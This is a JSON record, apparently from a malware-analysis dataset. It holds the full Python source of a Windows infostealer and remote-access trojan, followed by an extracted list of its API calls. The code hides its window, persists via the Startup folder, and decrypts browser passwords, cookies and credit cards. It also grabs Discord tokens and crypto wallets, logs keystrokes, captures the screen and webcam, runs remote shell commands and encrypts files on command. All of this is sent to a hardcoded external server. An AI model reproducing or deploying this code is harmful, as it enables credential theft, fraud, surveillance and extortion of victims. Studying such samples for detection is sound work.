[
  {
    "pyfile": "__init__.py",
    "code_snippet": "import win32gui, win32console;win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)\nfrom cryptography.fernet import Fernet\nimport socketio, base64, os, socket, platform, requests, sqlite3, json, shutil, random, string, re, time, threading, cv2, zipfile, ctypes, sys, webbrowser, keyboard\nfrom win32crypt import CryptUnprotectData\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\n\nsio = socketio.Client()\n\nwapned_path = os.getenv(\"temp\") + \"/\"\nrandom_name = lambda x: ''.join([random.choice(list(string.ascii_letters)) for _ in range(x)])\nappdata = os.getenv('LOCALAPPDATA')\nroaming = os.getenv(\"appdata\")\non = False\n\nclass Startup:\n    def __init__(self) -> None:\n        self.filename = sys.argv[0]\n        self.path = f\"C:/Users/{os.getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/bit64start.{self.filename.split('.')[-1]}\"\n        if not os.path.exists(self.path):\n            shutil.copy(\n                self.filename,\n                self.path)\n\nclass Browser:\n    def __init__(self, name, path) -> None:\n        self.path = path\n        self.name = name\n        self.profiles = [\n            '/Default',\n            '/Profile 1',\n            '/Profile 2',\n            '/Profile 3',\n            '/Profile 4',\n            '/Profile 5',\n            ]\n        self.profiles = [profile for profile in self.profiles if os.path.exists(path + profile)]\n        information['browsers'][self.name]={}\n        self.master_key = self.get_master_key()\n    \n    def get_master_key(self) -> bytes:\n        with open(os.path.join(self.path, \"Local State\"), \"r\", encoding=\"utf-8\") as f:\n            local_state = json.load(f)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def decrypt(self, buff: bytes) -> str:\n        iv, payload = buff[3:15], buff[15:]\n        cipher = AES.new(self.master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\n        return decrypted_pass\n\n    def create_temporal_db(self, db) -> str:\n        if os.path.exists(db):\n            copy_path = wapned_path + random_name(10)\n            try:\n                print(copy_path)\n                shutil.copy(db, copy_path)\n            except Exception as e:\n                print(e)\n                return False\n            return copy_path\n        else:\n            return False\n\n    def cards(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + \"/Web Data\"\n            temporal_db = self.create_temporal_db(original_db)\n            \n            if not temporal_db: return\n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')\n\n            cards = [\n                {\n                \"name\":info[0],\n                \"month\":info[1],\n                \"year\":info[2],\n                \"number\":self.decrypt(info[3]),\n                \"date_modified\":info[4]\n                }for info in cursor.fetchall()\n                if info[0] or info[1] or info[2] or info[3]\n            ]\n            \n            information['browsers'][self.name]['cards']=cards\n            conn.close()\n            os.remove(temporal_db)\n            return cards\n        \n    def passwords(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + \"/Login Data\"\n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            \n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT action_url, username_value, password_value FROM logins')\n\n            passwords = [\n                {\n                \"url\":info[0],\n                \"username\":info[1],\n                \"password\":self.decrypt(info[2])\n                }for info in cursor.fetchall()\n                if info[2]\n            ]\n            information['browsers'][self.name]['passwords'] = passwords\n            information['passwords'] = information['passwords'] + passwords\n            conn.close()\n            os.remove(temporal_db)\n            return passwords\n\n    def history(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + f\"/History\"\n            \n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            \n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT url, title, last_visit_time FROM urls')\n\n            history = [\n                {\n                \"url\":info[0],\n                \"title\":info[1],\n                \"timestamp\":info[2]\n                }for info in cursor.fetchall()[0:1500]\n                if info[0] and info[1] and info[2]\n            ]\n            information['browsers'][self.name]['web-history']=history\n            conn.close()\n            os.remove(temporal_db)\n            return history\n\n    def cookies(\n        self\n        ) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + f\"/Network/Cookies\"\n            temporal_db = self.create_temporal_db(\n                original_db\n                )\n            if not temporal_db:\n                return\n            \n            conn = sqlite3.connect(\n                temporal_db\n            )\n            cursor = conn.cursor()\n            cursor.execute(\n                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies'\n            )\n            \n            cookies = [\n                {\n                \"url\":info[0],\n                \"expires\":info[1],\n                \"path\":info[2],\n                \"name\":self.decrypt(info[3]),\n                \"value\":info[4]\n                }\n                for info in cursor.fetchall()\n                if info[0] and info[1] and info[2] and info[3] and info[4]\n            ]\n            information[\"browsers\"][self.name][\"cookies\"] = cookies\n            information['cookies'] = information['cookies'] + cookies\n            conn.close()\n            os.remove(\n                temporal_db\n            )\n            return cookies\n\nclass GrabbBrowsers:\n    def __init__(\n        self\n        ) -> None:\n        self.browsers = {\n            'epic-privacy-browser': f'{appdata}/Epic Privacy Browser/User Data',\n            'google-chrome-sxs': f'{appdata}/Google/Chrome SxS/User Data',\n            'brave': f'{appdata}/BraveSoftware/Brave-Browser/User Data',\n            'microsoft-edge': f'{appdata}/Microsoft/Edge/User Data',\n            'google-chrome': f'{appdata}/Google/Chrome/User Data',\n            'yandex': f'{appdata}/Yandex/YandexBrowser/User Data',\n            'cent-browser': f'{appdata}/CentBrowser/User Data',\n            'sputnik': f'{appdata}/Sputnik/Sputnik/User Data',\n            'uran': f'{appdata}/uCozMedia/Uran/User Data',\n            '7star': f'{appdata}/7Star/7Star/User Data',\n            'orbitum': f'{appdata}/Orbitum/User Data',\n            'vivaldi': f'{appdata}/Vivaldi/User Data',\n            'iridium': f'{appdata}/Iridium/User Data',\n            'kometa': f'{appdata}/Kometa/User Data',\n            'amigo': f'{appdata}/Amigo/User Data',\n            'torch': f'{appdata}/Torch/User Data',\n        }\n    \n    def start(\n        self,\n        option: str,\n        ) -> None:\n        content = []\n        for name, path in self.browsers.items():\n            if os.path.exists(path):\n                BrowserObject = Browser(\n                    name,\n                    path\n                )\n                if option == 'cookies':\n                    a = BrowserObject.cookies()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'passwords':\n                    a = BrowserObject.passwords()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'cards':\n                    a = BrowserObject.cards()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'history':\n                    a = BrowserObject.history()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'all':\n                    for operation in [\n                        BrowserObject.cookies,\n                        BrowserObject.passwords,\n                        BrowserObject.cards,\n                        BrowserObject.history,]:\n                        try:\n                            operation()\n                        except:\n                            pass\n\n        return content\n\n\nclass GetTokens:\n    def __init__(self):\n        self.paths = {\n        'Discord': f'{roaming}/discord/Local Storage/leveldb/',\n        'Discord Canary': f'{roaming}/discordcanary/Local Storage/leveldb/',\n        'Lightcord': f'{roaming}/Lightcord/Local Storage/leveldb/',\n        'Discord PTB': f'{roaming}/discordptb/Local Storage/leveldb/',\n        'Opera': f'{roaming}/Opera Software/Opera Stable/Local Storage/leveldb/',\n        'Opera GX': f'{roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb/',\n        'Amigo': f'{appdata}/Amigo/User Data/Local Storage/leveldb/',\n        'Torch': f'{appdata}/Torch/User Data/Local Storage/leveldb/',\n        'Kometa': f'{appdata}/Kometa/User Data/Local Storage/leveldb/',\n        'Orbitum': f'{appdata}/Orbitum/User Data/Local Storage/leveldb/',\n        'CentBrowser': f'{appdata}/CentBrowser/User Data/Local Storage/leveldb/',\n        '7Star': f'{appdata}/7Star/7Star/User Data/Local Storage/leveldb/',\n        'Sputnik': f'{appdata}/Sputnik/Sputnik/User Data/Local Storage/leveldb/',\n        'Vivaldi': f'{appdata}/Vivaldi/User Data/Default/Local Storage/leveldb/',\n        'Chrome SxS': f'{appdata}/Google/Chrome SxS/User Data/Local Storage/leveldb/',\n        'Chrome': f'{appdata}/Google/Chrome/User Data/Default/Local Storage/leveldb/',\n        'Chrome1': f'{appdata}/Google/Chrome/User Data/Profile 1/Local Storage/leveldb/',\n        'Chrome2': f'{appdata}/Google/Chrome/User Data/Profile 2/Local Storage/leveldb/',\n        'Chrome3': f'{appdata}/Google/Chrome/User Data/Profile 3/Local Storage/leveldb/',\n        'Chrome4': f'{appdata}/Google/Chrome/User Data/Profile 4/Local Storage/leveldb/',\n        'Chrome5': f'{appdata}/Google/Chrome/User Data/Profile 5/Local Storage/leveldb/',\n        'Epic Privacy Browser': f'{appdata}/Epic Privacy Browser/User Data/Local Storage/leveldb/',\n        'Microsoft Edge': f'{appdata}/Microsoft/Edge/User Data/Defaul/Local Storage/leveldb/',\n        'Uran': f'{appdata}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb/',\n        'Yandex': f'{appdata}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/',\n        'Brave': f'{appdata}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/',\n        'Iridium': f'{appdata}/Iridium/User Data/Default/Local Storage/leveldb/'\n    }\n        self.regexp = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.regexp_enc = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n    \n    def start(self) -> None:\n        for name, path in self.paths.items():\n            if os.path.exists(path):\n                if \"cord\" in name:\n                    self.get_discord(name, path)\n                else:\n                    self.get_browser(name, path)\n        self.get_firefox()\n            \n    def get_master_key(self, path: str) -> bytes:\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n    \n    def decrypt_data(self, buff: bytes, master_key: bytes) -> str:\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\n    def get_discord(self, name, path) -> None:\n        localstate = roaming+f'/{name.replace(\" \",\"\").lower()}/Local State'\n        if os.path.exists(localstate):\n            for filename in [filename for filename in os.listdir(path) if filename.split(\".\")[-1] in [\"log\", \"ldb\"]]:\n                for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:\n                    for y in re.findall(self.regexp_enc, line):\n                        master_key = self.get_master_key(localstate)\n                        encrypted = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])\n                        token = self.decrypt_data(encrypted, master_key)\n                        Token(token)\n    \n    def get_browser(self, name, path) -> None:\n        for filename in [filename for filename in os.listdir(path) if filename.split(\".\")[-1] in [\"log\", \"ldb\"]]:\n            for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:\n                for token in re.findall(self.regexp, line):\n                    Token(token)\n\n    def get_firefox(self) -> None:\n        if os.path.exists(roaming+\"/Mozilla/Firefox/Profiles\"):\n            for path, _, files in os.walk(roaming+\"/Mozilla/Firefox/Profiles\"):\n                for file in [file for file in files if file.endswith('.sqlite')]:\n                    for line in [x.strip() for x in open(f'{path}/{file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regexp, line):\n                            Token(token)\n\nclass Token:\n    def __init__(self, token: str) -> None:\n        self.token = token\n        self.check()\n\n    def check(self) -> None:\n        if not self.token in information['tokens']:\n            information['tokens'].append(self.token)\n\nclass Grabb:\n    def __init__(self) -> None:\n        pass\n    \n    def getInformation(self) -> dict:\n        information = {}\n        try:\n            hwid = os.popen('wmic csproduct get uuid').read().split('\\n')[1].strip()\n        except:\n            hwid = \"None\"\n        ip_adress = requests.get('https://api.ipify.org').text\n        username = os.getenv(\"UserName\") \n        computername = os.getenv(\"COMPUTERNAME\")\n        information[\"hwid\"]=hwid\n        information['username']=username\n        information['computername']=computername\n        information[\"os\"]=platform.system() + \" \" + platform.version()\n        information[\"ipv4\"]=socket.gethostbyname(\n            socket.gethostname()\n        )\n        information[\"ip\"]=ip_adress\n        information[\"machine\"]=platform.machine()\n        return information\n\n    def screenshot(self) -> str:\n        path = os.getenv('temp') + \"/\" + \"image.png\"\n        screenshot = ImageGrab.grab()\n        screenshot.save(path)\n        print(path)\n        return path\n    \n    def webcam(self) -> str:\n        cap = cv2.VideoCapture(0)\n        if not cap.isOpened():\n            return\n        ret, frame = cap.read()\n        if not ret:\n            return\n        filename = os.getenv('temp') + \"/\" + \"webcam-photo.png\"\n        cv2.imwrite(filename, frame)\n        cap.release()\n        return filename\n\nclass FileMagnament:\n    def __init__(\n        self\n        ) -> None:\n        self.globals = [\n            os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\n            os.path.join(os.path.expanduser(\"~\"), \"OneDrive\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Videos\"),\n        ]\n        self.files = {}\n    \n    @staticmethod\n    def convertPathToZip(\n        name: str,\n        path: str\n        ) -> None:\n        if os.path.exists(path):\n            zip_name = wapned_path + name.replace(\" \", \"\") + \".zip\"\n            os.chdir(path)\n            if len(os.listdir(path)) > 0:\n                with zipfile.ZipFile(zip_name, \"w\") as f:\n                    for file in os.listdir(path):\n                        f.write(file)\n            return zip_name\n\n    def basicGrb(\n        self,\n        wallets=False,\n        relevant=False,\n        read=True,\n        ) -> dict:\n        if wallets==True:\n            self.paths = {\n                \"Atomic LevelDB\": f\"{roaming}/atomic/Local Storage/leveldb\",\n                \"Exodus Wallet\": f\"{roaming}/Exodus/exodus.wallet\",\n                \"Exodus Wallet LevelDB\": f\"{roaming}/Exodus/Local Storage/leveldb\",\n                \"Atomic Wallet\": f\"{roaming}/AtomicWallet/Local Storage/leveldb\",\n                \"Electrum Wallet\": f\"{roaming}/Electrum/wallets/leveldb\",\n                \"Bitcoin Core\": f\"{roaming}/Bitcoin/Core/leveldb\",\n                \"Litecoin Core\": f\"{roaming}/Litecoin/Core/leveldb\",\n                \"Ethereum (Geth)\": f\"{roaming}/Ethereum/geth/leveldb\",\n                \"Ethereum (Parity)\": f\"{roaming}/Ethereum/paritydb/leveldb\",\n                \"Monero\": f\"{roaming}/Monero/lmdb/leveldb\",\n                \"Dash Core\": f\"{roaming}/DashCore/blocks/index/leveldb\",\n            }\n        elif relevant==True:\n            self.paths = {\n                \"Epic Games LevelDB\": f\"{roaming}/Epic Games/UnrealEngineLauncher/Launcher/storage/assets/DataStore/filecache/*\",\n                \"Steam LevelDB\": f\"{roaming}/Steam/config/*/localconfig.vdf\",\n                \"Rockstar Games LevelDB\": f\"{roaming}/Rockstar Games/Social Club/Databases/*\",\n                \"Ubisoft LevelDB\": f\"{roaming}/Ubisoft/Ubisoft Game Launcher/cache/core/*\",\n                \"Origin LevelDB\": f\"{roaming}/Origin/LocalContent/EAD4*/cache/*\",\n                \"GOG.com LevelDB\": f\"{roaming}/GOG.com/Galaxy/storage/cache/*\",\n                \"Rave LevelDB\": f\"{roaming}/Rave/Local Storage/leveldb/\"\n            }\n        for name, path in self.paths.items():\n            zipfile = self.convertPathToZip(\n                name=name,\n                path=path\n            )\n            if zipfile != None:\n                if read:\n                    with open(zipfile, \"rb\") as f:\n                        file_data = f.read()\n                    self.files[zipfile.replace(wapned_path, \"\")]=file_data\n                else:\n                    self.files[zipfile.replace(wapned_path, \"\")]=open(zipfile, \"rb\")\n        return self.files\n\n    def searchFile(\n        self,\n        filename=None,\n        filenames=None,\n        path='C:/',\n        ) -> str | dict:\n        for act, dirs, files in os.walk(path):\n            for file in files:\n                if filename != None:\n                    if filename.lower() in file.lower():\n                        self.filesfiles.append(os.path.join(act, file))\n                else:\n                    for file_ in filenames:\n                        if file_.lower() in file.lower():\n                            self.files[random_name(5) + \"-\" + file]=open(os.path.join(act, file), \"rb\").read()\n                            break\n\n    def getBackupCodes(\n        self\n        ) -> dict:\n        for path in self.globals:\n            self.searchFile(\n                filenames=[\n                    \"backup_codes\",\n                    \"discord_backup\",\n                    \"discord_codes\",\n                ],\n                path=path\n            )\n        return self.files\n\nclass Encrypter:\n    def __init__(\n        self,\n        path: str,\n        key: str\n        ) -> None:\n        self.key = bytes(key, 'utf-8')\n        self.fernet = Fernet(self.key)\n        if os.path.isfile(path):\n            self.paths = [path]\n        if os.path.isdir(path):\n            self.paths = [os.path.join(path, file) for file, _, __ in os.walk(path)]\n    \n    def encryptFiles(\n        self\n        ) -> None:\n        for file in self.paths:\n            if os.path.exists(file):\n                self.encrypt_file(file)\n        return True\n\n    def decryptFiles(\n        self\n        ) -> None:\n        for file in self.paths:\n            if os.path.exists(file):\n                self.decrypt_file(file)\n        return True\n\n    def encrypt_name(\n        self,\n        file: str\n        ) -> None:\n        os.rename(file, self.fernet.encrypt(os.path.basename(file)).decode() + \".exe\")\n\n    def encrypt_file(\n        self, \n        file: str\n        ) -> None:\n        with open(file, 'rb') as f:\n            e = self.fernet.encrypt(f.read())\n        with open(file, 'wb') as f:\n            f.write(e)\n\n    def decrypt_file(\n        self, \n        file: str\n        ) -> None:\n        with open(file, 'rb') as f:\n            e = self.fernet.decrypt(f.read())\n        with open(file, 'wb') as f:\n            f.write(e)\n\nObj = Grabb()\n\n\non = False\nclass KeyLogger:\n    def __init__(\n        self\n        ):\n        self.data = []\n\n    def keylog_event(\n        self,\n        key\n        ) -> None:\n        if key.event_type == keyboard.KEY_DOWN:\n            self.data.append(key.name)\n            self.ultimatum = time.time()\n            print(f\"Tecla presionada: {key.name}\")\n\n    def start(\n        self\n        ) -> None:\n        global on\n        on = True\n        self.ultimatum = time.time()\n        keyboard.hook(self.keylog_event)\n        while on:\n            if self.ultimatum != None:\n                if (time.time() - self.ultimatum) > 5:\n                    self.ultimatum = None\n                    if len(self.data) > 100:\n                        self.send()\n        if not on:\n            keyboard.unhook_all()\n\n    def send(\n        self\n        ) -> None:\n        sio.emit('keylog-response', self.data)\n        self.data = []\n\n@sio.event\ndef connect():\n    sio.emit('join', user_id)\n    print('Conectado al servidor')\n\n@sio.on('command')\ndef command(cmd):\n    sio.emit('command-response', os.popen(cmd['cmd']).read())\n\n@sio.on('history')\ndef history():\n    sio.emit('history-response', GrabbBrowsers().start('history'))\n\n@sio.on('discord-tokens')\ndef tokens():\n    information['tokens']=[]\n    GetTokens().start()\n    time.sleep(5)\n    sio.emit('discord-tokens-response', information['tokens'])\n\n@sio.on('cards')\ndef cards():\n    sio.emit('cards-response', GrabbBrowsers().start('cards'))\n\n@sio.on('passwords')\ndef passwords():\n    sio.emit('passwords-response', GrabbBrowsers().start('passwords'))\n\n@sio.on('download')\ndef download(filename: str):\n    if os.path.exists(filename):\n        with open(filename, \"rb\") as f:\n            data = f.read()\n        sio.emit('download-response', {'file.' + filename.split('.')[-1]: data})\n    else:\n        sio.emit('download-response', False)\n\n@sio.on('backup-codes')\ndef getBackupCodes():\n    sio.emit('backup-codes-response', FileMagnament().getBackupCodes())\n\n@sio.on('cookies')\ndef cookies():\n    sio.emit('cookies-response', GrabbBrowsers().start('cookies'))\n\n@sio.on('browsers')\ndef browsers():\n    GrabbBrowsers().start('all',)\n    sio.emit('browsers-response', information['browsers'])\n\n@sio.on('website')\ndef website(url: str):\n    try:\n        webbrowser.open(url)\n        sio.emit('website-response', True)\n    except:\n        sio.emit('website-response', False)\n\n@sio.on('upload')\ndef upload(args: dict):\n    try:\n        response = requests.get(args['url'])\n        if response.status_code == 200:\n            with open(args['path'], \"wb\") as f:\n                f.write(response.content)\n            sio.emit('upload-response', True)\n        else:\n            sio.emit('upload-response', False)\n    except Exception as e:\n        sio.emit('upload-response', False)\n\n@sio.on('alert')\ndef upload(alert: str):\n    threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)).start()\n    sio.emit('alert-response', True)\n\n@sio.on('wallets')\ndef wallets():\n    sio.emit('wallets-response', FileMagnament().basicGrb(wallets=True))\n\n@sio.on('gamestores')\ndef wallets():\n    sio.emit('gamestores-response', FileMagnament().basicGrb(relevant=True))\n\n@sio.on('screenshot')\ndef screenshot():\n    with open(Obj.screenshot(), 'rb') as image_file:\n        image_data = image_file.read()\n        sio.emit('screenshot-response', image_data)\n\n@sio.on('webcam')\ndef screenshot():\n    file = Obj.webcam()\n    with open(file, 'rb') as image_file:\n        image_data = image_file.read()\n        sio.emit('webcam-response', image_data)\n\n@sio.on('ip')\ndef screenshot():\n    sio.emit('ip-response', requests.get('https://api.ipify.org').text)\n\n@sio.on('website')\ndef screenshot(url: str):\n    sio.emit('website-response', webbrowser.open(url=url))\n\n@sio.on('encrypt')\ndef encrypt(data):\n    file = data['path']\n    key = data['key']\n    sio.emit('encrypt-response', Encrypter(file, key).encryptFiles())\n\n@sio.on('decrypt')\ndef decrypt(data):\n    file = data['path']\n    key = data['key']\n    sio.emit('decrypt-response', Encrypter(file, key).decryptFiles())\n\n@sio.on('information')\ndef info():\n    sio.emit('information-response', Obj.getInformation())\n\n@sio.on('initkeylog')\ndef info(data: bool):\n    global on\n    global keylogthread\n    if data:\n        if not on:\n            keylogthread = threading.Thread(target=KeyLogger().start).start()\n            sio.emit('initkeylog-response', True)\n        else:\n            sio.emit('initkeylog-response', 101)\n    else:\n        on = False\n        try:\n            keylogthread.join()\n        except:\n            pass\n        sio.emit('initkeylog-response', False)\n\n@sio.on('listdir')\ndef listdir(path: str):\n    if os.path.exists(path):\n        sio.emit('listdir-response', {\"path\": path, \"files\":os.listdir(path)})\n    else:\n        sio.emit('listdir-response', False)\n\n@sio.event\ndef disconnect():\n    pass\n\ndef define_(\n    id_: str,\n    api_: str,\n    init=True,\n    ) -> None:\n    global user_id\n    user_id = id_\n    global api_url\n    api_url = api_\n    global information\n    if init:\n        Startup()\n        wallets_ = FileMagnament().basicGrb(wallets=True, read=False)\n        information = {\n            \"passwords\":[],\n            \"cookies\":[],\n            \"browsers\":{},\n            \"tokens\":[],\n            \"information\":Obj.getInformation(),\n            \"wallets\":[name for name, x in wallets_.items()],\n        }\n        GrabbBrowsers().start('all')\n        GetTokens().start()\n        r = requests.post(\n            url=f'{api_url}/api/{user_id}/',\n            json=information,\n        )\n        \n        r = requests.post(\n            url=f'{api_url}/api/{user_id}/wallets/',\n            files=wallets_,\n        )\n\n    information = {}\n\n    sio.connect(api_url)\n    try:\n        sio.wait()\n    except Exception as e:\n        print(e)\n    sio.disconnect()\n\napi = \"https://yeezy-api.onrender.com/\"\nuser_id = \"1166039508446351390\"\n\ndefine_(\n    user_id,\n    api,\n    True,\n)\n",
    "pattern_analysis": {
      "api_sequence": [
        "win32console.GetConsoleWindow",
        "win32gui.ShowWindow",
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "shutil.copy",
        "os.path.exists",
        "os.path.join",
        "open",
        "json.load",
        "base64.b64decode",
        "CryptUnprotectData",
        "AES.new",
        "AES.new.decrypt",
        "os.path.exists",
        "shutil.copy",
        "open",
        "shutil.copy",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "AES.new",
        "AES.new.decrypt",
        "sqlite3.Connection.close",
        "os.remove",
        "os.path.exists",
        "shutil.copy",
        "open",
        "shutil.copy",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "AES.new",
        "AES.new.decrypt",
        "sqlite3.Connection.close",
        "os.remove",
        "os.path.exists",
        "shutil.copy",
        "open",
        "shutil.copy",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Connection.close",
        "os.remove",
        "os.path.exists",
        "shutil.copy",
        "open",
        "shutil.copy",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "AES.new",
        "AES.new.decrypt",
        "sqlite3.Connection.close",
        "os.remove",
        "os.path.exists",
        "os.listdir",
        "open",
        "open.readlines",
        "re.findall",
        "base64.b64decode",
        "CryptUnprotectData",
        "AES.new",
        "AES.new.decrypt",
        "os.listdir",
        "open",
        "open.readlines",
        "re.findall",
        "os.path.exists",
        "os.walk",
        "open",
        "open.readlines",
        "re.findall",
        "os.popen",
        "os.popen.read",
        "requests.get",
        "os.getenv",
        "os.getenv",
        "platform.system",
        "platform.version",
        "socket.gethostname",
        "socket.gethostbyname",
        "platform.machine",
        "os.getenv",
        "ImageGrab.grab",
        "ImageGrab.Image.save",
        "cv2.VideoCapture",
        "cv2.VideoCapture.isOpened",
        "cv2.VideoCapture.read",
        "os.getenv",
        "cv2.imwrite",
        "cv2.VideoCapture.release",
        "os.path.join",
        "os.path.expanduser",
        "os.path.join",
        "os.path.expanduser",
        "os.path.join",
        "os.path.expanduser",
        "os.path.join",
        "os.path.expanduser",
        "os.path.join",
        "os.path.expanduser",
        "os.path.exists",
        "os.chdir",
        "os.listdir",
        "zipfile.ZipFile",
        "os.listdir",
        "zipfile.ZipFile.write",
        "open",
        "open.read",
        "os.walk",
        "open",
        "open.read",
        "os.rename",
        "Fernet.encrypt",
        "open",
        "Fernet.encrypt",
        "open",
        "open",
        "Fernet.decrypt",
        "open",
        "keyboard.hook",
        "time.time",
        "time.time",
        "keyboard.unhook_all",
        "sio.emit",
        "sio.emit",
        "os.popen",
        "os.popen.read",
        "sio.emit",
        "sio.emit",
        "GrabbBrowsers.start",
        "sio.emit",
        "GetTokens.start",
        "time.sleep",
        "sio.emit",
        "sio.emit",
        "GrabbBrowsers.start",
        "sio.emit",
        "GrabbBrowsers.start",
        "sio.emit",
        "os.path.exists",
        "open",
        "open.read",
        "sio.emit",
        "sio.emit",
        "FileMagnament.getBackupCodes",
        "sio.emit",
        "GrabbBrowsers.start",
        "sio.emit",
        "GrabbBrowsers.start",
        "sio.emit",
        "webbrowser.open",
        "sio.emit",
        "requests.get",
        "open",
        "open.write",
        "sio.emit",
        "threading.Thread",
        "ctypes.windll.user32.MessageBoxW",
        "threading.Thread.start",
        "sio.emit",
        "FileMagnament.basicGrb",
        "sio.emit",
        "FileMagnament.basicGrb",
        "sio.emit",
        "Obj.screenshot",
        "open",
        "open.read",
        "sio.emit",
        "Obj.webcam",
        "open",
        "open.read",
        "sio.emit",
        "requests.get",
        "sio.emit",
        "webbrowser.open",
        "sio.emit",
        "Encrypter.encryptFiles",
        "sio.emit",
        "Encrypter.decryptFiles",
        "sio.emit",
        "Obj.getInformation",
        "sio.emit",
        "threading.Thread",
        "KeyLogger.start",
        "threading.Thread.start",
        "sio.emit",
        "threading.Thread.join",
        "sio.emit",
        "os.path.exists",
        "os.listdir",
        "sio.emit",
        "sio.emit",
        "Startup",
        "FileMagnament.basicGrb",
        "GrabbBrowsers.start",
        "GetTokens.start",
        "requests.post",
        "requests.post",
        "sio.connect",
        "sio.wait",
        "sio.disconnect"
      ],
      "api_sequence_with_args": [
        "win32console.GetConsoleWindow()",
        "win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)",
        "os.getenv(\"temp\")",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv(\"appdata\")",
        "os.path.exists(self.path)",
        "shutil.copy(self.filename, self.path)",
        "os.path.exists(path + profile)",
        "os.path.join(self.path, \"Local State\")",
        "open(os.path.join(self.path, \"Local State\"), \"r\", encoding=\"utf-8\")",
        "json.load(f)",
        "base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]",
        "CryptUnprotectData(master_key, None, None, None, 0)[1]",
        "AES.new(self.master_key, AES.MODE_GCM, iv)",
        "cipher.decrypt(payload)[:-16].decode()",
        "os.path.exists(db)",
        "shutil.copy(db, copy_path)",
        "open(zipfile, \"rb\")",
        "shutil.copy(db, copy_path)",
        "sqlite3.connect(temporal_db)",
        "conn.cursor()",
        "cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')",
        "cursor.fetchall()",
        "AES.new(self.master_key, AES.MODE_GCM, iv)",
        "cipher.decrypt(payload)[:-16].decode()",
        "conn.close()",
        "os.remove(temporal_db)",
        "os.path.exists(db)",
        "shutil.copy(db, copy_path)",
        "open(zipfile, \"rb\")",
        "shutil.copy(db, copy_path)",
        "sqlite3.connect(temporal_db)",
        "conn.cursor()",
        "cursor.execute('SELECT action_url, username_value, password_value FROM logins')",
        "cursor.fetchall()",
        "AES.new(self.master_key, AES.MODE_GCM, iv)",
        "cipher.decrypt(payload)[:-16].decode()",
        "conn.close()",
        "os.remove(temporal_db)",
        "os.path.exists(db)",
        "shutil.copy(db, copy_path)",
        "open(zipfile, \"rb\")",
        "shutil.copy(db, copy_path)",
        "sqlite3.connect(temporal_db)",
        "conn.cursor()",
        "cursor.execute('SELECT url, title, last_visit_time FROM urls')",
        "cursor.fetchall()[0:1500]",
        "conn.close()",
        "os.remove(temporal_db)",
        "os.path.exists(db)",
        "shutil.copy(db, copy_path)",
        "open(zipfile, \"rb\")",
        "shutil.copy(db, copy_path)",
        "sqlite3.connect(temporal_db)",
        "conn.cursor()",
        "cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')",
        "cursor.fetchall()",
        "AES.new(self.master_key, AES.MODE_GCM, iv)",
        "cipher.decrypt(payload)[:-16].decode()",
        "conn.close()",
        "os.remove(temporal_db)",
        "os.path.exists(path)",
        "os.listdir(path)",
